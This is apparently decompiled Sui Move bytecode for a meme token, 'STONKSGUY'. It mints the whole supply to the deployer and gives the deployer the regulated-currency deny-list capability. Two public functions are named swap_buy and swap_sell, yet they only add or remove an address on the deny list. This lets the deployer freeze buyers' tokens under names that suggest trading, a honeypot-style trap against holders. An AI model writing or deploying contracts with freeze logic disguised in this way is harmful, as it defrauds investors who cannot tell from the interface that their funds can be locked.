module 0xee5f2fc2cb00d1bd161e3a2d2f0d530306e89af14988ba9345a708b73219d9dd::stonksguy {
    struct STONKSGUY has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: STONKSGUY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<STONKSGUY>(arg0, 9, b"STONKSGUY", b"Just a Stonks Guy", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmfPiC5WRgfs2pZ3ZEkA6bEt9cDV4TmADLGRrrxm7A16JT"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<STONKSGUY>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<STONKSGUY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<STONKSGUY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<STONKSGUY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<STONKSGUY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<STONKSGUY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<STONKSGUY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<STONKSGUY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

